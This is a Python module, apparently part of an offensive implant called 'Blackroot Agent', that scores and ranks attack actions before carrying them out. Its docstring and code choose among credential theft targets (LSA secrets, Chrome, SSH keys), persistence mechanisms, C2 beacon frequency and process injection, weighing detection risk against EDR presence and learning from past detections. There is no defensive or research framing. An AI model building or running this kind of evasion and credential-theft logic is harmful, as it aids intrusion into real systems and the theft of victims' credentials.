"""
Causal Simulator: Evaluate Consequences Before Acting
=====================================================

Core strategic reasoning engine that:
1. Predicts outcomes of interventions before execution
2. Compares multiple strategic options
3. Detects counterfactual reasoning (what if scenario)
4. Scores decisions based on multi-factor objectives

Used by decision engines to determine:
- Which credentials to extract given threat level
- Which persistence mechanisms to enable
- C2 communication frequency
- Process injection technique selection

Author: Blackroot Agent v4
Date: April 6, 2026
"""

import logging
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum

from causal_graph import CausalGraph, CausalEdge

logger = logging.getLogger("CausalSimulator")


@dataclass
class SimulationResult:
    """Result of simulating an intervention"""
    intervention: str
    predicted_effects: Dict[str, float]  # effect → impact
    survival_score: float  # 0.0-1.0: how well this survives
    risk_score: float  # 0.0-1.0: detection/capture likelihood
    value_score: float  # 0.0-1.0: strategic value gained
    overall_score: float  # Weighted combination
    explanation: str  # Human-readable reasoning
    
    def __repr__(self):
        return (
            f"SimulationResult(\n"
            f"  intervention={self.intervention}\n"
            f"  survival={self.survival_score:.2%}, "
            f"risk={self.risk_score:.2%}, "
            f"value={self.value_score:.2%}\n"
            f"  overall={self.overall_score:.3f}\n"
            f"  explanation: {self.explanation}\n"
            f")"
        )


@dataclass
class CounterfactualResult:
    """Comparison of actual vs. counterfactual outcomes"""
    actual_intervention: str
    actual_outcome: float  # What really happened
    predicted_outcome: float  # What we predicted
    counterfactual_options: List[Tuple[str, float]]  # What we could have done
    best_alternative: str  # Best option in hindsight
    regret_magnitude: float  # How wrong we were (0.0-1.0)
    lessons_learned: List[str]  # What to adjust next time


class ThreatEnvironmentType(Enum):
    """Categories of threat environments"""
    LOW = "low"  # Home/personal machine, no security monitoring
    MEDIUM = "medium"  # Corporate but basic EDR/detection
    HIGH = "high"  # Advanced EDR, active security team
    CRITICAL = "critical"  # Actively under investigation


class CausalSimulator:
    """
    Simulates consequences of actions before committing to them
    
    Usage:
        simulator = CausalSimulator(causal_graph)
        
        # Predict outcome of single intervention
        result = simulator.simulate_intervention("extract_lsa")
        
        # Compare multiple strategies
        best = simulator.rank_interventions(
            ["extract_chrome", "extract_lsa", "extract_ssh"],
            threat_level="high"
        )
        
        # Analyze actual vs. predicted (learning)
        counterfactual = simulator.counterfactual_analysis(
            actual_intervention="extract_chrome",
            actual_outcome=0.3,  # EDR caught it in 30 minutes
            options=["extract_lsa", "extract_ssh"]
        )
    """
    
    def __init__(self, graph: CausalGraph):
        self.graph = graph
        logger.info(f"[CausalSimulator] Initialized with graph: {graph}")
    
    def simulate_intervention(
        self,
        intervention: str,
        threat_environment: ThreatEnvironmentType = ThreatEnvironmentType.MEDIUM,
        current_threat_score: float = 50.0,
        edr_detected: bool = False,
        privilege_level: str = "user"
    ) -> SimulationResult:
        """
        Predict consequences of an intervention
        
        Args:
            intervention: The action to simulate
            threat_environment: Threat level context
            current_threat_score: Current threat level (0-100)
            edr_detected: Whether EDR/AV is present
            privilege_level: Current privilege ("user", "admin", "system")
        
        Returns:
            SimulationResult with predicted impacts
        """
        
        # Get direct effects from causal graph
        effects = self.graph.query_effects(intervention)
        
        # Extract key metrics
        detection_risk = effects.get("detection_risk", 0.0)
        survival_probability = effects.get("survival_probability", 0.0)
        data_value = effects.get("data_value", 0.0)
        privilege_gain = effects.get("privilege_gain", 0.0)
        persistence_quality = effects.get("persistence_quality", 0.0)
        lateral_reach = effects.get("lateral_reach", 0.0)
        
        # Adjust for environment
        env_multipliers = {
            ThreatEnvironmentType.LOW: 0.4,  # Lower risk in low-threat environments
            ThreatEnvironmentType.MEDIUM: 1.0,  # Baseline
            ThreatEnvironmentType.HIGH: 1.3,  # Higher risk in high-threat
            ThreatEnvironmentType.CRITICAL: 1.6,  # Much higher risk if active investigation
        }
        env_mult = env_multipliers.get(threat_environment, 1.0)
        
        # EDR detection multiplier
        edr_mult = 1.5 if edr_detected else 1.0
        
        # Calculate risk score (higher = worse)
        adjusted_detection_risk = min(
            1.0,
            detection_risk * env_mult * edr_mult
        )
        risk_score = adjusted_detection_risk
        
        # Calculate survival score (higher = better)
        # Survival = (1 - detection_risk) * persistence * privilege_gain
        survival_from_detection = (1.0 - adjusted_detection_risk)
        survival_from_persistence = persistence_quality * 0.3  # Persistence helps survival
        survival_from_privilege = privilege_gain * 0.2  # Privilege helps survival
        survival_score = survival_from_detection + survival_from_persistence + survival_from_privilege
        survival_score = min(1.0, max(0.0, survival_score))  # Clamp [0, 1]
        
        # Calculate value score (higher = more strategic value)
        # Value = data + privilege + reach + persistence
        value_score = (
            data_value * 0.3 +
            privilege_gain * 0.3 +
            lateral_reach * 0.2 +
            persistence_quality * 0.2
        )
        value_score = min(1.0, max(0.0, value_score))
        
        # Overall score: balance survival vs. value
        # High-threat environments penalize value (focus on survival)
        survival_weight = 0.6 if threat_environment == ThreatEnvironmentType.CRITICAL else 0.5
        value_weight = 1.0 - survival_weight
        
        overall_score = (survival_score * survival_weight) + (value_score * value_weight)
        
        # Generate explanation
        explanation = self._generate_explanation(
            intervention=intervention,
            survival_score=survival_score,
            risk_score=risk_score,
            value_score=value_score,
            effects=effects,
            threat_env=threat_environment
        )
        
        result = SimulationResult(
            intervention=intervention,
            predicted_effects=effects,
            survival_score=survival_score,
            risk_score=risk_score,
            value_score=value_score,
            overall_score=overall_score,
            explanation=explanation
        )
        
        logger.debug(f"[CausalSimulator] Simulated {intervention}: survival={survival_score:.2%}, risk={risk_score:.2%}")
        return result
    
    def rank_interventions(
        self,
        options: List[str],
        threat_environment: ThreatEnvironmentType = ThreatEnvironmentType.MEDIUM,
        current_threat_score: float = 50.0,
        edr_detected: bool = False,
        privilege_level: str = "user",
        weights: Dict[str, float] = None
    ) -> List[SimulationResult]:
        """
        Rank multiple intervention options from best to worst
        
        Args:
            options: List of interventions to compare
            threat_environment: Threat level
            weights: Custom weights for scoring (if None, uses defaults)
        
        Returns:
            Sorted list of SimulationResults (best first)
        """
        
        results = []
        for option in options:
            result = self.simulate_intervention(
                option,
                threat_environment=threat_environment,
                current_threat_score=current_threat_score,
                edr_detected=edr_detected,
                privilege_level=privilege_level
            )
            results.append(result)
        
        # Sort by overall_score descending
        results.sort(key=lambda r: r.overall_score, reverse=True)
        
        logger.info(f"[CausalSimulator] Ranked {len(options)} options:")
        for i, result in enumerate(results):
            logger.info(f"  {i+1}. {result.intervention} (score={result.overall_score:.3f})")
        
        return results
    
    def counterfactual_analysis(
        self,
        actual_intervention: str,
        actual_outcome: float,  # What really happened (0-1, 1 = survived, 0 = detected)
        options: List[str],
        threat_environment: ThreatEnvironmentType = ThreatEnvironmentType.MEDIUM,
    ) -> CounterfactualResult:
        """
        Analyze "what if I chose differently?"
        
        Used for learning: Compare actual decision outcome against alternatives
        
        Args:
            actual_intervention: What we actually did
            actual_outcome: What really happened (0=bad, 1=good)
            options: Alternative interventions we could have chosen
            threat_environment: Context at the time
        
        Returns:
            Analysis including regret and lessons learned
        """
        
        # Get prediction for what we actually did
        actual_result = self.simulate_intervention(
            actual_intervention,
            threat_environment=threat_environment
        )
        predicted_outcome = actual_result.overall_score
        
        # Get predictions for alternatives
        alt_results = [
            self.simulate_intervention(
                option,
                threat_environment=threat_environment
            )
            for option in options
        ]
        
        # Find best alternative
        best_alt = max(alt_results, key=lambda r: r.overall_score)
        
        # FIXED REGRET CALCULATION:
        # Regret = Prediction Error + Opportunity Cost
        # This captures both: how wrong we were AND what we left on the table
        
        # 1. Prediction error magnitude (how wrong was our forecast)
        prediction_error = abs(actual_outcome - predicted_outcome)
        
        # 2. Opportunity cost (best alternative we didn't choose)
        opportunity_cost = max(0.0, best_alt.overall_score - actual_result.overall_score)
        
        # Total regret combines both components
        regret = prediction_error + opportunity_cost
        
        # Generate lessons
        lessons = self._extract_lessons(
            actual=actual_result,
            alternatives=alt_results,
            actual_outcome=actual_outcome,
            predicted_outcome=predicted_outcome
        )
        
        result = CounterfactualResult(
            actual_intervention=actual_intervention,
            actual_outcome=actual_outcome,
            predicted_outcome=predicted_outcome,
            counterfactual_options=[(r.intervention, r.overall_score) for r in alt_results],
            best_alternative=best_alt.intervention,
            regret_magnitude=regret,
            lessons_learned=lessons
        )
        
        if regret > 0.1:
            logger.warning(
                f"[CausalSimulator] Counterfactual analysis: "
                f"Should have chosen {best_alt.intervention} "
                f"instead of {actual_intervention} (regret={regret:.2%})"
            )
        
        return result
    
    def _generate_explanation(
        self,
        intervention: str,
        survival_score: float,
        risk_score: float,
        value_score: float,
        effects: Dict[str, float],
        threat_env: ThreatEnvironmentType
    ) -> str:
        """Generate human-readable explanation of simulation"""
        
        parts = [f"Intervention: {intervention}"]
        
        # Threat environment context
        env_str = threat_env.value.upper()
        parts.append(f"Environment: {env_str}")
        
        # Key effects
        if effects:
            top_effects = sorted(
                effects.items(),
                key=lambda x: abs(x[1]),
                reverse=True
            )[:3]
            
            effects_str = ", ".join(
                f"{eff}={val:+.2f}" for eff, val in top_effects
            )
            parts.append(f"Effects: {effects_str}")
        
        # Risk assessment
        if risk_score > 0.7:
            risk_str = "HIGH RISK"
        elif risk_score > 0.4:
            risk_str = "MEDIUM RISK"
        else:
            risk_str = "LOW RISK"
        parts.append(f"{risk_str} (detection={risk_score:.1%})")
        
        # Survival potential
        if survival_score > 0.7:
            surv_str = "HIGH SURVIVAL"
        elif survival_score > 0.4:
            surv_str = "MEDIUM SURVIVAL"
        else:
            surv_str = "LOW SURVIVAL"
        parts.append(f"{surv_str} (survival={survival_score:.1%})")
        
        # Value assessment
        if value_score > 0.7:
            val_str = "HIGH STRATEGIC VALUE"
        elif value_score > 0.4:
            val_str = "MEDIUM VALUE"
        else:
            val_str = "LOW VALUE"
        parts.append(f"{val_str} (value={value_score:.1%})")
        
        return " | ".join(parts)
    
    def _extract_lessons(
        self,
        actual: SimulationResult,
        alternatives: List[SimulationResult],
        actual_outcome: float,
        predicted_outcome: float
    ) -> List[str]:
        """Extract learning points from actual vs. predicted"""
        
        lessons = []
        
        # Was our prediction wrong?
        prediction_error = abs(actual_outcome - predicted_outcome)
        if prediction_error > 0.3:
            lessons.append(
                f"Prediction error: expected {predicted_outcome:.1%} survival, "
                f"got {actual_outcome:.1%}. Adjust causal weights."
            )
        
        # Did we miss a better option?
        best_alt = max(alternatives, key=lambda r: r.overall_score)
        if best_alt.overall_score > actual.overall_score:
            lessons.append(
                f"Should have chosen {best_alt.intervention} "
                f"({best_alt.overall_score:.3f}) over {actual.intervention} "
                f"({actual.overall_score:.3f})"
            )
        
        # What worked well?
        positive_effects = [
            (e, v) for e, v in actual.predicted_effects.items() if v > 0.5
        ]
        if positive_effects:
            effects_str = ", ".join(f"{e}={v:.2f}" for e, v in positive_effects)
            lessons.append(f"Strong positive effects: {effects_str}")
        
        return lessons


if __name__ == "__main__":
    # Test simulator
    logging.basicConfig(level=logging.DEBUG)
    
    from causal_graph import create_credential_extraction_graph
    
    graph = create_credential_extraction_graph()
    simulator = CausalSimulator(graph)
    
    print("\n=== SINGLE INTERVENTION SIMULATION ===")
    result = simulator.simulate_intervention(
        "extract_lsa",
        threat_environment=ThreatEnvironmentType.HIGH,
        edr_detected=True
    )
    print(result)
    
    print("\n=== RANKING MULTIPLE OPTIONS ===")
    ranked = simulator.rank_interventions(
        ["extract_chrome", "extract_lsa", "extract_ssh"],
        threat_environment=ThreatEnvironmentType.HIGH,
        edr_detected=True
    )
    for i, r in enumerate(ranked):
        print(f"{i+1}. {r.intervention}: {r.overall_score:.3f}")
        print(f"   Survival: {r.survival_score:.1%}, Risk: {r.risk_score:.1%}")
